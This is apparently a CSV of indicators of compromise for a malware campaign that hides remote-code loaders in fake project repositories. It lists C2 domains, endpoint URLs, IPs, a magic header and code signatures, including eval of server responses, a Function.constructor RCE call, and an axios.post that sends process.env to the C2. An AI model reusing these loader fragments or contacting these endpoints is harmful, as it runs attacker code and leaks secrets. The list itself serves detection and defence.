type,value,first_seen,confidence,source,notes
domain,www.ipregionchecker.com,2026-05-18,high,realfraction/realfraction server/utils/regionChecker.js,Sole loader C2 for sub-shape A (realfraction-mvp); hardcoded URL string literal (not base64-obfuscated). DNS-empty as of 2026-05-18 because the apex is on registrar client hold at Unstoppable Domains
domain,ipregionchecker.com,2026-05-18,high,realfraction/realfraction server/utils/regionChecker.js,Apex of the C2 host. Registered 2026-04-19 at Unstoppable Domains; nameservers ns1.unstoppabledomains.com / ns2.unstoppabledomains.com; client hold status set 2026-05-07 (registrar-frozen — no resolution)
domain,www.isillegalregion.com,2026-05-18,high,slobodanmargetic988/real-world-assets server/controllers/paymentController.js,Second sole-loader C2 (sub-shape B); hardcoded URL string literal. DNS-active and serving live stage-2 payload as of 2026-05-18 (~2.85 MB obfuscated JS via x-secret-header POST)
domain,isillegalregion.com,2026-05-18,high,slobodanmargetic988/real-world-assets,Apex. Registered 2026-02-13 at Name.com; nameservers ns1.vercel-dns.com / ns2.vercel-dns.com — Vercel-hosted; resolves to 64.29.17.65 and 216.198.79.1 (Vercel edge)
domain,cookie-xi-seven.vercel.app,2026-05-18,high,fabiolin/schoolmgmt backend/src/constants/index.js,C2 for sub-shape G (constants+loader template, e.g. Paulooo0/go-test). Vercel deployment; currently DEPLOYMENT_DISABLED (HTTP 451 x-vercel-error: DEPLOYMENT_DISABLED) — already taken down by Vercel
domain,ip-check-api.vercel.app,2026-05-18,high,Jay-Sojitra/student-management-system backend/src/modules/departments/department-error.js,C2 for sub-shape H (Function.constructor RCE primitive). Vercel deployment; currently DEPLOYMENT_DISABLED — already taken down by Vercel
domain,realfraction.xyz,2026-05-18,high,realfraction GitHub org contact email,Lure-brand domain backing the realfraction GitHub org. Registered 2026-05-09 at Namecheap; nameservers dns1.registrar-servers.com / dns2.registrar-servers.com; resolves to 162.255.119.72 (Namecheap parking IP)
url,https://www.ipregionchecker.com/api/ip-check-encrypted/3aeb34a31,2026-05-18,high,realfraction/realfraction server/utils/regionChecker.js,Full C2 POST endpoint for realfraction/realfraction. Sub-shape A
url,https://www.ipregionchecker.com/api/ip-check-encrypted/3aeb34a37,2026-05-18,high,devcode8/stock-home-assignment backend/src/config/config.js (default fallback for IPCHECK_URL env var),Full C2 POST endpoint for the stockx PoC sub-shape C. Used by LandinLin/0xbrentfi/Chainbits1/Lynqex-Labs/devcode8 variants
url,https://www.ipregionchecker.com/api/ip-check-encrypted/3aeb34a38,2026-05-18,high,chainvisita-protocols/realfraction-mvp server/utils/regionChecker.js,Full C2 POST endpoint for the chainvisita-protocols realfraction sibling
url,https://www.isillegalregion.com/api/ip-check-encrypted/3aeb34a39,2026-05-18,high,slobodanmargetic988/real-world-assets server/controllers/paymentController.js,Full C2 POST endpoint for sub-shape B (inline paymentController). Sequential suffix scheme (a31/a37/a38/a39) suggests per-instance enumeration by the operator
url,https://cookie-xi-seven.vercel.app/api/ipcheck-encrypted/6KDisdfjlskjDI837KJH4,2026-05-18,high,fabiolin/schoolmgmt + Paulooo0/go-test + KagiyamaWeb/PyPDFMicroservise + Wilovy09/deby-assignment + pablodiaz2799/solice-skill-test,Full C2 POST endpoint for sub-shape G. Note distinct path prefix ipcheck-encrypted (no dash) and high-entropy alphanumeric API key (not the a31/a3X hex suffix scheme). Currently DEPLOYMENT_DISABLED
url,https://ip-check-api.vercel.app/api/ipcheck-encrypted/3948uf2uhe9r298rh2,2026-05-18,high,Jay-Sojitra/student-management-system + sparsh-kr24/Student-Management-System + ahmedraza90/test-fullstack,Full C2 GET endpoint for sub-shape H. Uses HTTP GET (not POST) and Function.constructor RCE primitive. Currently DEPLOYMENT_DISABLED
url-path,/api/ip-check-encrypted/,2026-05-18,high,sub-shapes A/B/C,Path prefix used by C2 hosts ipregionchecker.com and isillegalregion.com; suffix is hex-incrementing (3aeb34a31/a37/a38/a39)
url-path,/api/ipcheck-encrypted/,2026-05-18,high,sub-shapes G/H,Distinct path prefix (no dash) used by C2 hosts cookie-xi-seven.vercel.app and ip-check-api.vercel.app; suffix is alphanumeric token
ipv4,64.29.17.65,2026-05-18,high,DNS A for isillegalregion.com,Vercel edge IP; not stable but useful at the time of capture
ipv4,216.198.79.1,2026-05-18,high,DNS A for isillegalregion.com,Vercel edge IP; not stable but useful at the time of capture
ipv4,64.29.17.3,2026-05-18,high,DNS A for cookie-xi-seven.vercel.app and ip-check-api.vercel.app,Vercel edge IP; both disabled deployments share the same edge IPs
ipv4,216.198.79.3,2026-05-18,high,DNS A for cookie-xi-seven.vercel.app and ip-check-api.vercel.app,Vercel edge IP; both disabled deployments share the same edge IPs
ipv4,162.255.119.72,2026-05-18,medium,DNS A for realfraction.xyz,Namecheap parking IP — lure-brand domain not actively serving content
http-header,x-secret-header: secret,2026-05-18,high,multiple loader files across all realfraction-family sub-shapes,Magic header sent client->C2 by every realfraction-family loader; effectively zero false positive on outbound dev-host HTTP. Note that the stockx PoC variant (sub-shape C) sends it as `{headers: {...}}` in axios.post's body position rather than the config position — so the header is NOT actually emitted on the wire from that sub-shape; the source signature still matches
http-header,x-vercel-error: DEPLOYMENT_DISABLED,2026-05-18,high,response headers from cookie-xi-seven.vercel.app and ip-check-api.vercel.app,Vercel-emitted header when probing a disabled deployment; useful as a corroborating signal that a previously-active C2 has been taken down
http-body,blocked,2026-05-18,high,loader source (sub-shapes A and B),Literal 7-byte negative-gate sentinel; causes the loader to return without eval
http-body,"{""blocked"":true}",2026-05-18,high,loader source (sub-shapes A and B),JSON form of the negative-gate sentinel; checked via JSON.parse(data)?.blocked
code-pattern,eval(data),2026-05-18,medium,sub-shapes A/B (regionChecker / inline paymentController),RCE primitive; generic on its own but high-signal when paired with x-secret-header in the same file
code-pattern,eval(response.data),2026-05-18,medium,sub-shape C (stockx complianceService),RCE primitive used by the axios.post variant
code-pattern,"new Function.constructor(""require"", errCode)",2026-05-18,high,sub-shape H (Jay-Sojitra et al.),Distinctive RCE primitive — Function.constructor === Function so morally identical to new Function but evades grep patterns targeting `new Function(`. Same RCE primitive as the AjunaVerse-family generations
code-pattern,"axios.post(api, { ...process.env }, { headers: { ""x-secret-header"": ""secret"" } })",2026-05-18,high,sub-shapes D/E/F (mock/users.js, settingController.js, redis.js),Hybrid: realfraction-family magic header (x-secret-header) paired with AjunaVerse-family env-exfil-at-loader-stage. The loader DOES carry process.env on the wire (unlike sub-shape A where the POST has no body)
code-pattern,"axios.post(config.ipCheckUrl, { headers: { ""x-secret-header"": ""secret"" } })",2026-05-18,high,sub-shape C (stockx complianceService),Note the BUG: axios.post's 2nd positional arg is data not config — the headers object is sent as the request body and no x-secret-header is actually emitted on the wire from this sub-shape. Source signature matches; wire signature does not
code-pattern,"https.request(regionCheckApi, { method: 'POST', headers: { 'x-secret-header': 'secret' } }",2026-05-18,high,sub-shapes A/B,Distinctive call shape; matches no normal application code
code-pattern,"const regionChecker = require(""../utils/regionChecker"")",2026-05-18,medium,sub-shape A trigger,Side-effect-only import; variable never read; trigger site for the loader
code-pattern,initializeComplianceService(),2026-05-18,medium,sub-shape C trigger (called from backend/src/index.js at Express boot),Loader-init function called from server entrypoint; pair with complianceService.js inspection
github-org,realfraction,2026-05-18,high,GitHub org page,Org id 279572783; single-repo GitHub org created 2026-04-27; contact email hello@realfraction.xyz; only public repo is realfraction/realfraction
